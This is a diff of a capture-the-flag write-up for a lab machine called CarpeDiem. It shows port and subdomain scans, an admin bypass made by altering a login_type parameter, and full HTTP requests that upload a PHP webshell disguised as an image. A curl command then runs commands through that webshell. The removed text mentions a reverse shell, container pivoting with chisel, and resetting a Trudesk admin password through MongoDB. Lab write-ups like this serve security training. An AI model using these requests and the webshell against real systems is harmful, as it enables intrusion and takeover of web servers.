@@ -1,285 +1,160 @@
 # CarpeDiem (WIP)
 
-CarpeDiem (WIP)
-
-Tuesday, June 28, 2022
-
-10:16 AM
+## Gaining Access
 
 Nmap scan:
 
-!\[\[33\_CarpeDiem (WIP)\_image001.png]]
+```
+$ nmap -p- --min-rate 5000 10.129.227.179
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-11 05:45 EDT
+Nmap scan report for 10.129.227.179
+Host is up (0.014s latency).
+Not shown: 65533 closed tcp ports (conn-refused)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+```
 
-&#x20;
+### Web Enum
 
-!\[\[33\_CarpeDiem (WIP)\_image002.png]]
+Port 80 hosted a website that had a countdown to a domain being launched.
 
-&#x20;
+<figure><img src="../../../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>
 
-Port 80:
+There was nothing interesting about this website. The search there is static. We can do a `gobuster` directory and `wfuzz` subdomain scan. `gobuster` only picked up on static site files, but `wfuzz` picked up on a `portal` endpoint:
 
-!\[\[33\_CarpeDiem (WIP)\_image003.png]]
+```
+$ wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H 'Host:FUZZ.carpediem.htb' --hw=161 -u http://carpediem.htb  /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
 
-&#x20;
+Target: http://carpediem.htb/
+Total requests: 19966
 
-We can add that to our /etc/hosts file and try to find more directories that are within this website.
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                     
+=====================================================================
 
-&#x20;
+000000048:   200        462 L    2174 W     31090 Ch    "portal"
+```
 
-A directory enumeration returns nothing, but a vhost enumeration returns one other potential website we can head to:
+### Admin Bypass --> File Upload
 
-!\[\[33\_CarpeDiem (WIP)\_image004.png]]
+This was running some motorcycle store portal:
 
-&#x20;
+<figure><img src="../../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
 
-!\[\[33\_CarpeDiem (WIP)\_image005.png]]
+We can create an account with the site. After registering, we can update our profile:
 
-&#x20;
+<figure><img src="../../../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>
 
-This brings us to some kind of motorcycle store.
+This is the request generated:
 
-!\[\[33\_CarpeDiem (WIP)\_image006.png]]
+{% code overflow="wrap" %}
+```http
+POST /classes/Master.php?f=update_account HTTP/1.1
+Host: portal.carpediem.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: application/json, text/javascript, */*; q=0.01
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+X-Requested-With: XMLHttpRequest
+Content-Length: 115
+Origin: http://portal.carpediem.htb
+Connection: close
+Referer: http://portal.carpediem.htb/?p=edit_account
+Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
 
-There's a p parameter, and LFI and RFI do not work here.
 
-The pages use a hash to distinguish which product they are referring to, which is a bit odd.
 
-!\[\[33\_CarpeDiem (WIP)\_image007.png]]
+id=25&login_type=2&firstname=test&lastname=test&contact=test&gender=Male&address=test123&username=test123&password=
+```
+{% endcode %}
 
-&#x20;
+There's a `login_type` parameter set at 2, so let's change that to 1 and we might become an administrator. I tested this by visiting `/admin` and it worked:
 
-There are logins and admin panels present, but we have no known credentials.
+<figure><img src="../../../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
 
-&#x20;
+When looking around, we can see there's a Quartely Sales Report part hwhere we can upload files:
 
-When updating the profiles of a user we created, we can see the parameters here.
+<figure><img src="../../../.gitbook/assets/image (11).png" alt=""><figcaption></figcaption></figure>
 
-!\[\[33\_CarpeDiem (WIP)\_image008.png]]
+The upload functions still being in development might mean this is vulnerable. I tried clicking on Add, but it did nothing. When inspecting the traffic, we can see it making POST requests to `/classes/users.php?f=upload`.&#x20;
 
-&#x20;
+<figure><img src="../../../.gitbook/assets/image (24).png" alt=""><figcaption></figcaption></figure>
 
-There appears to be a login\_type, of which I have changed the value to 1 for testing.
+This accepts form-data and also is a PHP-based website (as from X-Powered-By), so let's try to upload a PHP webshell. I took some requests I had from other machines / scripts that also uploaded form-data.&#x20;
 
-Afterwards, we can access the admin panel.
+```http
+POST /classes/Users.php?f=upload HTTP/1.1
+Host: portal.carpediem.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Origin: http://portal.carpediem.htb
+Connection: close
+Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
+Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
+Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
+Content-Length: 268
 
-&#x20;
+-----------------------------9051914041544843365972754266
+Content-Disposition: form-data; name="file_upload"; filename="a.html"
+Content-Type: text/html
 
-!\[\[33\_CarpeDiem (WIP)\_image009.png]]
+<!DOCTYPE html><title>Content of a.html.</title>
 
-&#x20;
+-----------------------------9051914041544843365972754266--
+```
 
-Within the settings, it appears there is quarterly sales report .xlsx file.
+The above request works and it will be uploaded:
 
-!\[\[33\_CarpeDiem (WIP)\_image0010.png]]
+<figure><img src="../../../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
 
-&#x20;
+Now we can try to upload a PHP webshell using an image in `Content-Type` because there's a check for that.&#x20;
 
-So the vulnerability is the file upload.
+```http
+POST /classes/Users.php?f=upload HTTP/1.1
+Host: portal.carpediem.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+X-Requested-With: XMLHttpRequest
+Origin: http://portal.carpediem.htb
+Connection: close
+Referer: http://portal.carpediem.htb/admin/?page=maintenance/files
+Cookie: PHPSESSID=23b68a0603f55733b3d5172c5121111a
+Content-Type: multipart/form-data; boundary=---------------------------9051914041544843365972754266
+Content-Length: 253
 
-We can try to upload a file to this.
 
-&#x20;
 
-When we view the request, we can see that we need to include the form data.
+-----------------------------9051914041544843365972754266
+Content-Disposition: form-data; name="file_upload"; filename="b.php"
+Content-Type: image/png
 
-So this could be the way.
+<?php system($_REQUEST['cmd']); ?>
 
-&#x20;
+-----------------------------9051914041544843365972754266--
+```
 
-!\[\[33\_CarpeDiem (WIP)\_image0011.png]]
+Then we can verify it works:
 
-&#x20;
+```
+$ curl http://portal.carpediem.htb/uploads/1683799320_b.php?cmd=id      
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-&#x20;
+Then, we can get an easy reverse shell.
 
-!\[\[33\_CarpeDiem (WIP)\_image0012.png]]
+<figure><img src="../../../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
 
-&#x20;
+## Docker Escape
 
-!\[\[33\_CarpeDiem (WIP)\_image0013.png]]
+### MySQL Creds
 
-&#x20;
-
-Shell:
-
-!\[\[33\_CarpeDiem (WIP)\_image0014.png]]
-
-&#x20;
-
-Upload a PHP reverse shell.
-
-Then curl the URL and we should get one.
-
-&#x20;
-
-{width="9.75in" height="2.3541666666666665in"}
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0016.png]]
-
-&#x20;
-
-We are in a container, it seems.
-
-!\[\[33\_CarpeDiem (WIP)\_image0017.png]]
-
-&#x20;
-
-We can find some root passwords and stuff.
-
-&#x20;
-
-There also is this.
-
-!\[\[33\_CarpeDiem (WIP)\_image0018.png]]
-
-&#x20;
-
-Perhaps we need to chisel some things over, to get the MySQL database accessible to us.
-
-&#x20;
-
-Also, there are other things like this.
-
-!\[\[33\_CarpeDiem (WIP)\_image0019.png]]
-
-&#x20;
-
-So it seems that this server has a port 3306 listening, and we should be using chisel to try and access this MySQL database.
-
-So we know that 171.17.0.3 has the SQL database and 172.17.0.5 is something completely different.
-
-&#x20;
-
-There seem to be a load of containers within this machine, and we need to find out which is which. First thing we can do it is an nmap scan of every single domain that is present on this machine to see which is alive.
-
-&#x20;
-
-We can download an nmap binary to the amchine and then do this command:
-
-!\[\[33\_CarpeDiem (WIP)\_image0020.png]]
-
-&#x20;
-
-Results:
-
-!\[\[33\_CarpeDiem (WIP)\_image0021.png]]
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0022.png]]
-
-&#x20;
-
-Seems like there are a load of other things on this machine.
-
-&#x20;
-
-We can chisel and proxychains the rest.
-
-!\[\[33\_CarpeDiem (WIP)\_image0023.png]]
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0024.png]]
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0025.png]]
-
-&#x20;
-
-Afterwards, we can access the different ports that are present.
-
-Then we can configure foxyproxy to use proxychains to view the stuff on these websites.
-
-&#x20;
-
-MySQL:
-
-{width="8.510416666666666in" height="3.4791666666666665in"}
-
-&#x20;
-
-Since we were root on this MySQL user, we can theoretically abuse the UDF functions of this. Nothing of use within this one.
-
-&#x20;
-
-Port 443 on 172.17.0.2:
-
-!\[\[33\_CarpeDiem (WIP)\_image0027.png]]
-
-&#x20;
-
-This is yet another domain.
-
-There are logins and stuff but we can't do much without some form of credentials.
-
-&#x20;
-
-Additionally, there is a trudesk.carpediem.htb on 172.17.0.6 on port 8118.
-
-&#x20;
-
-This box has a lot of leads.
-
-Let's look into that MongoDB database first.
-
-&#x20;
-
-I tried to access stuff like backdrop and truman, and it worked.
-
-{width="3.9479166666666665in" height="0.65625in"}
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0029.png]]
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0030.png]]
-
-&#x20;
-
-Lots of information here.
-
-{width="9.854166666666666in" height="2.25in"}
-
-&#x20;
-
-&#x20;
-
-We can actually modify the password and stuff from MongoDB as well.
-
-!\[\[33\_CarpeDiem (WIP)\_image0032.png]]
-
-&#x20;
-
-This would modify the admin password of trudesk and we would be able to login to that website.
-
-Not sure what else there is to do here though, what we should be doing is looking at the zoiper thing.
-
-&#x20;
-
-There are some initial credentials too, so what's the default credential?
-
-&#x20;
-
-When logging into the trudesk with our alterered password, we can see the tickets.
-
-!\[\[33\_CarpeDiem (WIP)\_image0033.png]]
-
-&#x20;
-
-!\[\[33\_CarpeDiem (WIP)\_image0034.png]]
-
-There seems to be mention of this Horace Flaccus, which would become the username of hflaccus. This user apparently has a default credential used.
-
-Basically, Zoiper this and find the voicemail, that's our next step.
-
-&#x20;
-
-&#x20;
-
-&#x20;
